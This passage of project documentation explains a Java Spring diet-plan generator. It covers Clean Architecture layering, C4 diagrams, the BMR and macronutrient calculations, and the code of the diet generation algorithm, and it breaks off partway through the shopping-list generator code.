## 2.1 Clean Architecture

Clean Architecture, introduced by Robert C. Martin, offers numerous benefits for backend applications. It enforces a
clear separation of concerns, enhancing code manageability and comprehension. This structure improves testability by
decoupling business logic from external dependencies, leading to more robust code. The modularity of Clean Architecture
increases flexibility and maintainability, allowing changes in one part of the application without impacting others. It
also promotes independence from specific frameworks.

Sure, here's a concise overview of each layer in Clean Architecture:

1. Presentation Layer
    - Responsibility: Manages user interactions.
    - Components: UIs, Views, Controllers.
    - Function: Interprets user inputs, displays data.
    - Dependency: Depends on the Application layer.
2. Domain Layer
    - Responsibility: Core business logic and rules.
    - Components: Entities, Value Objects, Domain Services.
    - Function: Defines business concepts and rules.
    - Dependency: Independent, no dependencies.
3. Application Layer
    - Responsibility: Orchestrates business operations.
    - Components: Use Cases, Application Services.
    - Function: Executes operations and coordinates data flow.
    - Dependency: Depends on the Domain layer.
4. Infrastructure Layer
    - Responsibility: Provides technical implementations.
    - Components: Databases, External APIs, Frameworks.
    - Function: Handles technical details and concrete implementations.
    - Dependency: Depends on all other layers.

In the diagram below, we can clearly see that the domain layer doesn't know anything about the application layer. The
same applies to the application layer; it has knowledge about the domain but doesn't know anything about the
infrastructure or presentation layers.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-layer-diagram.png)

Here is another popular diagram that describe clean architecture.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-circle-diagram.webp)

Apart the separation of concerns, another main goal is to keep domain and application layer completely clear from any
frameworks or libraries.
This was nearly archived. The application use lombok library in domain and application layers. Lombok is
lightweight library and allow us to reduce lots of boilerplate code. On the screen we can see usage of lombok
in `Recipe` class where is 10 fields in total. We literally reduced 100 lines of code just to 4 lines.

![Lombok Diagram screenshot](/screenshots/lombok_ss.png)

You may wonder how application layer receive data from database without knowing anything about the infrastructure layer.
The solution is quite interesting. In application layer we create interfaces that are templates and doesn't have any
logic.
Those interfaces are implemented by the infrastructure layer and application layer doesn't need to know how it was done.
UseCase implementation belong to application layer, and usually it need some data from the database. To solve that
problem we simply register
`UseCaseImpl` with `@Bean` in infrastructure layer in `BeanConfiguration` class where we also inject our implementation
of required repository.
As you can see we separate application and domain layers from framework (Spring in this case) completely.

Diagram below show tha basic sample implementation.

![Bean Registration Diagram screenshot](/screenshots/beanregistration_diagram.png)

This approach give us lots of flexibility. We can change our database or the whole framework.
We can rewrite whole infrastructure layer without changing even 1 line in application or domain layers.
Well, in fact our core still depends on infrastructure and presentation layers, those need to be there, but the borders
are clearly created.

Packages according to the clean architecture are presented below:

![Packages screenshot](/screenshots/package_structure_ss.png)

### 2.2 C4 Model

""The C4 model was created as a way to help software development teams describe and communicate software architecture,
both during up-front design sessions and when retrospectively documenting an existing codebase. It's a way to create
maps of your code, at various levels of detail, in the same way you would use something like Google Maps to zoom in and
out of an area you are interested in.""

You can read more about C4 Model at this [LINK](https://c4model.com/)

The C4 model has 4 parts:

### 2.2.1 C1 System Context

![C1 screenshot](/screenshots/c1planning.png)

### 2.2.2 C2 Container

![C2 screenshot](/screenshots/c2planning.png)

### 2.2.3 C3 Component

![C3 screenshot](/screenshots/c3planning.png)

### 2.2.4 C4 Code - Calculator Component

![C4 screenshot](/screenshots/calculator_component_diagram_ss.png)

### 2.2.4 C4 Code - Diet Generator Component

![C4 screenshot](/screenshots/generator_component_ss.png)

### 2.2.4 C4 Code - Ninja Service Component

![C4 screenshot](/screenshots/ninja_service_ss.png)

# 3. Domain

---

To understand this application first we need to possess the knowledge how human bodies works.

## 3.1 How human body works

### 3.1.1 How kcal Works:

Calories are a measure of energy, and when we talk about food energy, we use the term kilocalories (kcal), commonly
referred to simply as ""calories"" in everyday language. The concept of calorie intake, expenditure, and deficit is
central to understanding weight management.

**Energy Source**: The food we eat provides energy measured in kcal. This energy fuels our body's basic functions (like
breathing and blood circulation), physical activities, and the processing of food itself.

**Energy Expenditure**: Our body uses the energy in several ways:

* Basal Metabolic Rate (BMR): The energy needed for basic functions at rest.
* Physical Activity: The energy expended through exercise and routine daily movements.
* Thermic Effect of Food (TEF): The energy used to digest, absorb, and metabolize food.

Weight management depends on the balance between energy intake (the calories you consume) and energy
expenditure (the calories you burn).

`Change in body weight = Calories consumed âˆ’ Calories expended`

The number of calories (kcal) required for a person depends on various factors
such as age, gender, weight, height, and physical activity level.

### 3.1.2 BMI

Calculating your Basal Metabolic Rate (BMR) helps you understand how many calories your body needs at rest to maintain
basic physiological functions. The BMR can be estimated using several formulas, with the Harris-Benedict Equation and
the Mifflin-St Jeor Equation being the most commonly used.

This application currently supports the Mifflin-St Jeor equation

Male equation `BMR = (10 Ã— weight in kg) + (6.25 Ã— height in cm)  âˆ’ (5 Ã— age in years) + 5`

Female equation `BMR = (10 Ã— weight in kg) + (6.25 Ã— height in cm) âˆ’ (5 Ã— age in years) âˆ’ 161`

### 3.1.3 TDEE

To calculate the total daily energy expenditure (TDEE), which represents the total number of calories needed to maintain
your current weight, you multiply your Basal Metabolic Rate (BMR) by an activity factor:

- Sedentary (little or no exercise): BMR Ã— 1.2
- Lightly active (light exercise/sports 1-3 days/week): BMR Ã— 1.375
- Moderately active (moderate exercise/sports 3-5 days/week): BMR Ã— 1.55
- Very active (hard exercise/sports 6-7 days a week): BMR Ã— 1.725
- Super active (very hard exercise/sports & a physical job): BMR Ã— 1.9

### 3.1.4 TEF

Calculating thermic effect of food (TEF) is not necessary for average person and currently is not supported. This may
change in the future.

## 3.2 Data representation

The main business entities are `Diet`, `Dish`, `Product`, `Recipe` and `Nutrients`. The application create `Diet` object
that consist
of multiple
`Dish` objects. Those dishes are created from `Recipe` and `Product` objects using `DietGenerator` where special
algorithm is implemented to adjust the `Macronutrient` requirements.
First, lets look closer at `Recipe` and `Product` objects and their sub-objects to understood better how fundamental
data is
represented.

### 3.2.1 Product

```java
public class Product {

    private UUID id;
    private String name;
    private Nutrients nutrients;
    private Filler filler;
}
```

[//]: # (![Product Code screenshot]&#40;/screenshots/product_code_ss.png&#41;)

The Product object is depicted as shown in the screenshot. Besides the obvious fields - name and id (1:1 database
representation), there are two important fields - Nutrients and Filler. During database initialization, products are
fetched from CalorieNinjas
and marked with the appropriate filler. Based on this Filler, the DietGenerator decides if a product can be used to
increase or decrease macronutrients. `Nutrients` is representation of calories, carbohydrates, fats and proteins per
100g of the products.

### 3.2.2 Filler

The `Filler` enum is used to mark products to indicate if a product can be used to adjust macronutrients. In this
application
fillers are set up manually for best and controlled result, but algorithm can be implemented to decide if product is
suitable to be a Filler.

```java
public enum Filler {

    PROTEIN(""Protein""),
    FAT(""Fat""),
    CARBOHYDRATE(""Carbohydrate""),
    NONE(""None"");
}
```

[//]: # (![Filler Code screenshot]&#40;/screenshots/filler_code_ss.png&#41;)

### 3.2.3 Nutrients

```java
public class Nutrients {

    private Calories calories;
    private Carbohydrates carbohydrates;
    private Proteins proteins;
    private Fats fats;
}
```

[//]: # (![Nutrients Code screenshot]&#40;/screenshots/nutrients_code_ss.png&#41;)

The `Nutrients` object contains 3 basic public methods - addNutrients, subtractNutrients and createEmptyNutrients. First
two
return void and take another Nutrients object as parameter.
Those one are widely use across the application to perform subtraction and addition of the nutrients. The last method is
static and is used as starting point for new nutrient calculations.

Calories, Carbohydrates, Proteins and Fats are the classes that holds more specific information and are some kind of
wrappers.

Calories:

```java
public class Calories {
    private BigDecimal totalCalories;
}
```

[//]: # (![Calories Code screenshot]&#40;/screenshots/calories_code_ss.png&#41;)

Carbohydrates:

```java
public class Carbohydrates {
    private BigDecimal totalCarbohydrates;
    private BigDecimal fiber;
    private BigDecimal sugar;
}
```

[//]: # (![Carbohydrates Code screenshot]&#40;/screenshots/carbohydrates_code_ss.png&#41;)

Proteins:

```java
public class Proteins {
    private BigDecimal totalProteins;
}
```

[//]: # (![Proteins Code screenshot]&#40;/screenshots/proteins_code_ss.png&#41;)

Fats:

```java
public class Fats {
    private BigDecimal totalFats;
    private BigDecimal saturatedFats;
}
```

[//]: # (![Fats Code screenshot]&#40;/screenshots/fats_code_ss.png&#41;)

Every of those wrappers contain totalValue field and that is actual field that is used to perform calculations. Let's
look at `Fats` wrapper.
It has totalFats and saturatedFats fields. The saturatedFats amount is part of totalFats value and as you can see the ""
normal"" fats are not listed in the structure.
If you want to get the value of fats WITHOUT saturatedFats you need to perform your own
subtraction `totalFats - saturatedFats`. Knowing this may be useful if you decide to implement glycemic load where you
use value of carbohydrates excluding fiber. For now, glycemic load is not supported in this application and this may
change in the future.

### 3.2.4 Recipe

```java
public class Recipe {

    private UUID id;
    private String name;
    private Map<Product, BigDecimal> ingredientsProportion;
    private Nutrients nutrients;
    private BigDecimal basePortionInGrams;
    private boolean isScalable;
    private String howToPrepare;
    private List<DietType> dietTypes;
    private List<MealType> mealTypes;
    private Set<Filler> scalableFillers;
}
```

[//]: # (![Recipe Code screenshot]&#40;/screenshots/recipe_code_ss.png&#41;)

The `Recipe` object that are used to create base dish during diet creation. It has some useful information such as
dietType that indicate for which diet it can be used, mealTypes that indicate for which meal it can be used. The
ingredientsProportion field store the information about percentage ratio of each `Product` in the recipe. This will
guarantee
the same taste of the base portion when ever we decide to create large or small portion. When we adjust the
macronutrients using
product marked as fillers the ingredients ratio will change but the starting point will be always the same.
It also has a `Nutrients` object that represent nutrition information per 100g of the product.

### 3.2.5 MealType

The `MealType` is simple enum that contain supported meals. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet.

```java
public enum MealType {

    BREAKFAST(""Breakfast""),
    LUNCH(""Lunch""),
    DINNER(""Dinner""),
    SNACK(""Snack"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/mealtype_code_ss.png&#41;)

### 3.2.6 DietType

The `DietType` is simple enum that contain supported diets. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet. Currently, application support only one type: ""High Protein"". This can be very
easily extended. Each `DietType` has its own `MacroCalculator`.

```java
public enum DietType {

    PROTEIN(""High Protein"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/diettype_code_ss.png&#41;)

### 3.2.7 BigDecimal

In domain application layer, build in Java class `BigDecimal` is used to perform calculation instead of primitive
variables.
This class support basic math operations including very useful rounding by `RoundingMode` enum. Example usage:

```java
    private BigDecimal calculateCarbohydrates(BigDecimal requiredCalories, BigDecimal totalProteins, BigDecimal totalFats) {
    BigDecimal caloriesLeft = requiredCalories
            .subtract(totalProteins.multiply(BigDecimal.valueOf(4)))
            .subtract(totalFats.multiply(BigDecimal.valueOf(9)));
    return caloriesLeft.divide(BigDecimal.valueOf(4), 1, RoundingMode.HALF_UP);
}
```

[//]: # (![BigDecimal Code Usage screenshot]&#40;/screenshots/bigdecimal_code_example_ss.png&#41;)

Presented method is located in `HighProteinMacroCalculator` and contains chain subtraction, multiplication and division.
Note that scale 1 with `RoundingMode.HALF_UP` has been used to round result to 1 decimal place. Result of multiplication
is used as subtrahend for subtraction.

### 3.2.8 Dish

The `Dish` class is final meal representation class and it is result of `DietGenerator`. This class has factory method
that take `Recipe` and amount of
calories that dish has to has. The productsToGram holds the `Product` to actual value in grams required for that dish
as `BigDecimal`.
`Nutrients` object in this class holds the information about the total nutrients information for the whole meal(--->NOT
PER 100g<---). The recipe filed is the recipe that this dish has been created from. The `Dish` class also contains some
methods that are used to adjust macronutrients.

```java
public class Dish {

    private final Map<Product, BigDecimal> productToGrams;
    private final Nutrients nutrients;
    private final Recipe recipe;
    private final Map<Filler, Integer> numberOfFillers;
}
```

[//]: # (![Dish Code screenshot]&#40;/screenshots/dish_code_ss.png&#41;)

### 3.2.9 Diet

The `Diet` class is final diet representation class and it is returned by `DietGenerator` generateDiet method. It
contains list of dishes that are adjusted to the given `Macronutrient`, total `Nutrients` for the whole diet and
shoppingList that is simple name of the product to the amount in grams. The `Diet` class also contains some methods to
adjust macronutrients.

```java
public class Diet {

    private List<Dish> dishes;
    private Nutrients nutrients;
    private Map<String, Double> shoppingList;
}
```

[//]: # (![Diet Code screenshot]&#40;/screenshots/diet_code_ss.png&#41;)

## 3.3 Calculators

The application features three distinct calculators: `BMICalculator`, `BMRCalculator`, and `MacroCalculator`. The first
two, are standalone calculators. The application includes a dedicated controller
`CalculatorController`, with two endpoints to facilitate their use. The third calculator, `MacroCalculator`, is
particularly important as it is used to create the `Macronutrient` object for the `DietGenerator`.

### 3.3.1 BMICalculator

The `BMICalculator` is simple calculator that return BMI value for given parameters. It has only one static default
method calculate that take 2 parameters - bodyWeightInKg and heightInCm.

The BMI formula utilize metric system and is as follows:

`BMI = bodyWeightInKg / heightInMeters^2`

As you can see on the screen, heightInCm is converted to meters.

```java
public interface BMICalculator {

    static BigDecimal calculate(BigDecimal bodyWeightInKg, BigDecimal heightInCm) {
        if (bodyWeightInKg == null || bodyWeightInKg.doubleValue() <= 0 || heightInCm == null || heightInCm.doubleValue() <= 0)
            return BigDecimal.valueOf(0);

        BigDecimal heightInMeters = heightInCm.divide(new BigDecimal(""100""), new MathContext(3, RoundingMode.HALF_DOWN));
        BigDecimal heightSquared = heightInMeters.multiply(heightInMeters, new MathContext(3, RoundingMode.HALF_DOWN));
        return bodyWeightInKg.divide(heightSquared, new MathContext(3, RoundingMode.HALF_UP));
    }
}
```

[//]: # (![BMICalculator Code screenshot]&#40;/screenshots/bmicalculator_code_ss.png&#41;)

### 3.3.2 BMRCalculator

The `BMRCalculator` is an interface with a single method, calculate, which returns a `BaseMetabolicRate` object. This
method
takes one parameter, `BMRAttributes`, and is implemented by the `MifflinStJeorCalculator`. Other equations can also be
implemented using the `BMRCalculator` interface.

```java
public interface BMRCalculator {
    BaseMetabolicRate calculate(BMRAttributes bmrAttributes);
}
```

[//]: # (![BMRCalculator Code screenshot]&#40;/screenshots/bmrcalculator_code_ss.png&#41;)

This application currently support MifflinStJeor equations which is:

Male: `BMR = ( 10 Ã— bodyWeightInKg in kg ) + ( 6.25 Ã— heightInCm in cm ) âˆ’ ( 5 Ã— age in years ) + 5`

Female: `BMR=( 10 Ã— bodyWeightInKg in kg ) + ( 6.25 Ã— heightInCm in cm ) âˆ’ ( 5 Ã— age in years ) âˆ’ 161`

```java
public class MifflinStJeorCalculator implements BMRCalculator {

    @Override
    public BaseMetabolicRate calculate(BMRAttributes bmrAttributes) {
        if (bmrAttributes == null) return new BaseMetabolicRate(BigDecimal.valueOf(0));
        if (bmrAttributes.getGender() == Gender.MALE)
            return calculateUsingMaleEquation(bmrAttributes);
        else return calculateUsingFemaleEquation(bmrAttributes);
    }
}
```

[//]: # (![MifflinCalculator Code screenshot]&#40;/screenshots/mifflinstjeorcalculator_code_ss.png&#41;)

The `BMRAttributes` are presented below:

```java
public class BMRAttributes {
    private BigDecimal bodyWeightInKg;
    private BigDecimal heightInCm;
    private BigDecimal age;
    private ActiveLevel activeLevel;
    private Gender gender;
}
```

[//]: # (![BMRAttributes Code screenshot]&#40;/screenshots/bmrattributes_code_ss.png&#41;)

The `BaseMetabolicRate` object, created by the `MacroCalculator`, contains the actual value and has a single method,
`calculateTDEE`. This method takes one parameter, `ActiveLevel`. Based on the provided activity level, the base
metabolic
rate is multiplied, and the result is returned as a `BigDecimal`.

```java
public class BaseMetabolicRate {
    private BigDecimal BMR;

    public BigDecimal calculateTDEE(ActiveLevel activeLevel) {
        if (activeLevel == null) return BigDecimal.valueOf(0);
        BigDecimal multiplayer = BigDecimal.valueOf(activeLevel.getMultiplayer());
        return multiplayer.multiply(BMR).setScale(2, RoundingMode.HALF_DOWN);
    }
}
```

[//]: # (![BaseMetabolicRate Code screenshot]&#40;/screenshots/basemetabolicrate_code_ss.png&#41;)

The `ActiveLevel` enum is presented below:

```java
public enum ActiveLevel {
    SEDENTARY(1.2),
    LIGHTLY(1.375),
    MODERATELY(1.55),
    VERY(1.725),
    SUPER(1.9);
}
```

[//]: # (![ActiveLevel Code screenshot]&#40;/screenshots/activelevel_code_ss.png&#41;)

### 3.3.3 MacroCalculator

The `MacroCalculator` is a sealed interface with a single method, `calculate`, which returns a `Macronutrient` object
and
takes one parameter, `MacroCalculatorAttributes`. Each `DietType` requires its own `MacroCalculator` implementation, as
each
diet needs a different approach to macronutrients. For example, an average person who doesn't train should not consume
the same amount of protein as someone who engages in three resistance training sessions per week.

```java
public sealed interface MacroCalculator permits HighProteinMacroCalculator {
    Macronutrient calculate(MacroCalculatorAttributes requiredCalories);
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculator_code_ss.png&#41;)

The `MacroCalculator` is created by `MacroCalculatorFactory`.

```java
public class MacroCalculatorFactory {
    public static MacroCalculator getMacroCalculator(DietType dietType) {
        return switch (dietType) {
            case PROTEIN -> new HighProteinMacroCalculator();
            default -> throw new WrongInputException(""Unknown diet type"");
        };
    }
}
```

[//]: # (![MacroCalculatorFactory Code screenshot]&#40;/screenshots/macrocalculatorfactory_code_ss.png&#41;)

The `MacroCalculatorAttributes` is simple record that holds necessary information.

```java
public record MacroCalculatorAttributes(BigDecimal requiredCalories, BigDecimal bodyWeightInKg, Gender gender) {
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculatorattributes_code_ss.png&#41;)

The `HighProteinMacroCalculator` is the actual implementation of the `MacroCalculator` and uses its own equation.
Macronutrients are calculated in the order of protein, fats, and carbohydrates.

It is essential to note that each gram of protein and carbohydrate equals 4 kcal, and each gram of fat equals 9 kcal.
These values remain consistent across all diet types.

Proteins: `(2.2g MALE or 1.6g FEMALE) x Body Weight`

Fats: `30% of total caloric intake`

Carbohydrates: `Calculated as the remaining calories after proteins and fats`

Example: Male 100kg that requested 3000kcal diet.

Proteins: `2.2 x 100 = 220g` per day that are `220g x 4kcal = 880kcal` of total daily intake.

Fats: `0.3 x 3000kcal = 900kcal` of total daily intake that are `900 / 9kcal = 100g` of fats.

Carbohydrates: `3000 - (880kcal + 900kcal) = 1220kcal` of total daily intake that are `1220 / 4kcal = 305g`of
carbohydrates per day.

```java
public final class HighProteinMacroCalculator implements MacroCalculator {

    @Override
    public Macronutrient calculate(MacroCalculatorAttributes attributes) {
        if (attributes == null || attributes.requiredCalories() == null || attributes.bodyWeightInKg() == null || attributes.gender() == null) {
            return new Macronutrient(BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0));
        }
        BigDecimal totalProtein = calculateTotalProtein(attributes.bodyWeightInKg(), attributes.gender());
        BigDecimal totalFats = calculateTotalFats(attributes.requiredCalories());
        BigDecimal totalCarbohydrates = calculateCarbohydrates(attributes.requiredCalories(), totalProtein, totalFats);
        return new Macronutrient(attributes.requiredCalories(), totalProtein, totalFats, totalCarbohydrates);
    }
}

```

[//]: # (![HighProteinMacroCalculator Code screenshot]&#40;/screenshots/highproteinmacrocalculator_code_ss.png&#41;)

The `Macronutrient` serves as a holder for calculated values and is used in the `DietGenerator` to determine whether the
values need to be increased or decreased in the diet. It also has two methods, `reduceValues` and `increaseValues`,
which
take `Nutrients` as a parameter.

```java
public class Macronutrient {
    private BigDecimal calories;
    private BigDecimal proteins;
    private BigDecimal fats;
    private BigDecimal carbohydrates;
}
```

[//]: # (![Macronutrient Code screenshot]&#40;/screenshots/macronutrient_code_ss.png&#41;)

## 3.4 Generators

The application has 2 generators - `ShoppingListGenerator` and `DietGenerator`. First one is very simple, where the
second is rather complex.

### 3.4.1 DietGenerator

The `DietGenerator` is an interface with a single method, `generateDiet`, which does not take any parameters and returns
a
`Diet` object. This interface can be implemented to provide a new generator. In the current application, `DietGenerator`
is
implemented by the `DietGeneratorImpl` class, and this section is dedicated to that implementation.

The `DietGeneratorImpl` is an object created separately for each diet and is garbage collected after the request is
completed. To create it, you need `numberOfMeals` as a `BigDecimal`, a `Macronutrient`, and
a `Map<MealType, List<Recipe>>`. In addition to basic initialization in the constructor, 10% of the total requested
calories is reserved for
macronutrient adjustment. The baseCaloriesPerMeal field is created by subtracting the reserved calories from the total
calories and dividing it by numberOfMeals.

`baseCaloriesPerMeal = (totalCalories - (totalCalories * 0.1)) / numberOfMeals`

```java
public class DietGeneratorImpl implements DietGenerator {

    private final Random random;
    private final Map<MealType, List<Recipe>> recipes;
    private final Macronutrient missingMacronutrients;
    private final BigDecimal numberOfMeals;
    private final BigDecimal baseCaloriesPerMeal;


    public DietGeneratorImpl(BigDecimal numberOfMeals, Macronutrient missingMacronutrients, Map<MealType, List<Recipe>> recipes) {
        this.missingMacronutrients = missingMacronutrients;
        this.numberOfMeals = numberOfMeals;
        BigDecimal reservedCalories = missingMacronutrients.getCalories().multiply(BigDecimal.valueOf(0.1));
        BigDecimal requiredCaloriesAfterReservation = missingMacronutrients.getCalories().subtract(reservedCalories);
        this.baseCaloriesPerMeal = requiredCaloriesAfterReservation.divide(numberOfMeals, 2, RoundingMode.DOWN);
        this.random = new Random();
        this.recipes = recipes;
    }
}
```

[//]: # (![DietGeneratorImpl members and constructor Code screenshot]&#40;/screenshots/dietgeneratorfieldconstructor_code_ss.png&#41;)

After the `DietGeneratorImpl` is created, it contains all the necessary information to generate the diet. This includes
a
lists of `Recipe` for each `MealType`, the required `Macronutrient`, the
requested `numberOfMeals`, `baseCaloriesPerMeal`, and a
`Random` object for later usage.

```java

@Override
public Diet generateDiet() {
    Diet diet = new Diet();
    addDishes(diet);
    adjustMacronutrients(diet);
    diet.setShoppingList(ShoppingListGenerator.generateShoppingList(diet));
    return diet;
}
```

[//]: # (![DietGeneratorImpl generate Code screenshot]&#40;/screenshots/dietgeneratorgenerate_code_ss.png&#41;)

There are three main steps in diet creation, `addDishes`, `adjustMacronutrients` and `generateShoppingList`.

The `addDishes` method:

```java
    private void addDishes(Diet diet) {
    addDish(diet, MealType.BREAKFAST);
    for (int i = 1; i < numberOfMeals.doubleValue() - 1; i++) {
        if (i == 3) {
            addDish(diet, MealType.SNACK);
            continue;
        }
        addDish(diet, MealType.LUNCH);
    }
    addDish(diet, MealType.DINNER);
}
```

[//]: # (![DietGeneratorImpl addDishes Code screenshot]&#40;/screenshots/adddishesmethod_code_ss.png&#41;)

The diet plan is populated with specific meal types based on the requested number of meals:

- First Meal: Always Breakfast
- Last Meal: Always Dinner
- Fourth Meal (if applicable): Snack
- Middle Meals: Lunch-type meals

Random `Recipe` is picked from the list of given `MealType` to create a `Dish` and then added to the `Diet` object.
The `Dish` is created
using
static factory method. The nutrients information and required products in grams are calculated from given `Recipe`
and `baseCaloriesPerMeal`.
As `Recipe` holds `Nutrients` information per 100g of the products, `totalCalories` are divided by `baseCaloriesPerMeal`
to create the factor.
This factor is multiplied by each product proportion value to get the actual required grams of the product.

```java
    public static Dish createDish(Recipe recipe, BigDecimal requiredCalories) {
    BigDecimal recipeTotalCalories = recipe.getNutrients().getCalories().getTotalCalories();
    BigDecimal factor = requiredCalories.divide(recipeTotalCalories, 3, RoundingMode.HALF_UP);
    Map<Product, BigDecimal> emptyRecipeToGram = new HashMap<>();
    recipe.getIngredientsProportion().forEach(((product, proportion) -> {
        emptyRecipeToGram.put(product, proportion.multiply(factor));
    }));
    return new Dish(emptyRecipeToGram, recipe);
}
```

[//]: # (![Dish createDish Code screenshot]&#40;/screenshots/dishcreate_code_ss.png&#41;)

It is important to note that immediately after a `Dish` is added to the `Diet`, the macronutrients in
the `Macronutrient`
object are reduced by the total `Nutrients` value of the generated `Dish`. Once all requested dishes are added to
the `Diet`,
the `Macronutrient` object retains its `calories` field as 10% of the total requested calories, which is our reserved
calories value. The remaining fields â€” `proteins`, `fats`, and `carbohydrates` â€” are incorrect.

`Recipe` objects have strictly defined percentage ratios of `Product`, making it impossible to create a perfectly
macronutrient-balanced diet plan with randomly chosen recipes. While we can control the calories, the
specific macronutrient values must be adjusted accordingly.

The `adjustMacronutrients` method:

```java
   private void adjustMacronutrients(Diet diet) {
    int numberOfLoops = 3;
    for (int i = 0; i < numberOfLoops; i++) {
        if (missingMacronutrients.getCarbohydrates().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates(), missingMacronutrients);

        if (missingMacronutrients.getFats().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.FAT, missingMacronutrients.getFats().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.FAT, missingMacronutrients.getFats(), missingMacronutrients);

        if (missingMacronutrients.getProteins().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins(), missingMacronutrients);
    }
}
```

[//]: # (![DietGenerator adjustMacronutrient Code screenshot]&#40;/screenshots/adjustmacronutrient_code_ss.png&#41;)

This method check `Macronutrient`'s `carbohydrates`, `fats` and `proteins` fields. If the value is negative it means
there
is too much of the given macronutrient in the diet, if the value is positive it means there are missing macronutrient in
the diet and respectively `reduceMacronutrient` and `increaseMacronutrient` method are called on `Diet` object using
those offsets. Target
is to bring those values as close to 0 as possible.

As you can see on the screen, this operation is performed 3 times. It has to be done to generate diet accurately.
Each of missing macronutrients is adjusted separately, once we set our carbohydrates then during fats adjustment we may
break carbohydrates amount in the diet. Let's assume that we want to add 20g proteins to the diet, algorithm look for
all `Product` marked with `Filler.PROTEIN` and add calculated amount of those products to satisfy missing 20g of
proteins. Unfortunately, very likely this method is going to add also some carbohydrates and fats with those products.

Every iteration required macronutrients that need to be adjusted are closer to the 0 and three iterations is sufficient.

```java
    public void reduceValues(Nutrients nutrients) {
    setCalories(calories.subtract(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.subtract(nutrients.getProteins().getTotalProteins()));
    setFats(fats.subtract(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.subtract(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}

public void increaseValues(Nutrients nutrients) {
    setCalories(calories.add(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.add(nutrients.getProteins().getTotalProteins()));
    setFats(fats.add(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.add(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}
```

[//]: # (![Diet increase macro Code screenshot]&#40;/screenshots/increasemacro_code_ss.png&#41;)

Those method first look for `Dish` in the `Diet` object that can be scaled with the given `Filler`. Then the amount of
requested grams are distributed uniformly across the all suitable dishes and `Product`s in those `Dish`es by
calling `increaseFiller` or `reduceFiller`
methods.

Mentioned methods perform similar operation, but they iterate over `Product` list in the `Dish` and also updates
its own `Nutrients` to correct the changes.
The difference in `Nutrients` is returned and subtracted or added from `Macronutrient` object.

The `increaseFiller` method:

```java
public Nutrients increaseFiller(Filler filler, BigDecimal grams) {
    Nutrients totalAddedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || filler == Filler.NONE || grams.doubleValue() <= 0) {
        return totalAddedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalAddedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);
        productToGrams.forEach(((product, bigDecimal) -> {
            if (product.getFiller().equals(filler)) {
                BigDecimal currentGrams = productToGrams.get(product);
                BigDecimal productGramsToAdd = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
                productToGrams.put(product, currentGrams.add(productGramsToAdd));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToAdd);
                nutrients.addNutrients(subtractedNutrients);
                totalAddedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalAddedNutrients;
}
```

[//]: # (![Dish increaseFiller Code screenshot]&#40;/screenshots/increasefiller_code_ss.png&#41;)

The `reduceFiller` method:

```java
public Nutrients reduceFiller(Filler filler, BigDecimal grams) {
    Nutrients totalReducedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || grams.doubleValue() <= 0 || filler == Filler.NONE) {
        return totalReducedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalReducedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);

        Map<Product, BigDecimal> fillersToGrams = productToGrams.entrySet().stream()
                .filter(entry -> entry.getKey().getFiller().equals(filler))
                .collect(Collectors.toMap(
                        Map.Entry::getKey,
                        Map.Entry::getValue));

        fillersToGrams.forEach(((product, currentGrams) -> {
            BigDecimal productGramsToRemove = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
            if (currentGrams.subtract(productGramsToRemove).doubleValue() > 0) {
                productToGrams.put(product, currentGrams.subtract(productGramsToRemove));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToRemove);
                nutrients.subtractNutrients(subtractedNutrients);
                totalReducedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalReducedNutrients;
}
```

[//]: # (![Dish reduceFiller Code screenshot]&#40;/screenshots/reducefiller_code_ss.png&#41;)

### 3.4.2 ShoppingListGenerator

The `ShoppingListGenerator` is a simple interface with one default method that generates a `Map<String, Double>` of
product names to values
in grams for the entire diet. It requires only one parameter, which is `Diet`.

```java
public interface ShoppingListGenerator {

    static Map<String, Double> generateShoppingList(Diet diet) {
        Map<String, Double> shoppingList = new HashMap<>();

        diet.getDishes().forEach((dish -> {
            dish.getProductToGrams().forEach((product, grams) -> {
                Double currentValue = shoppingList.get(product.getName());
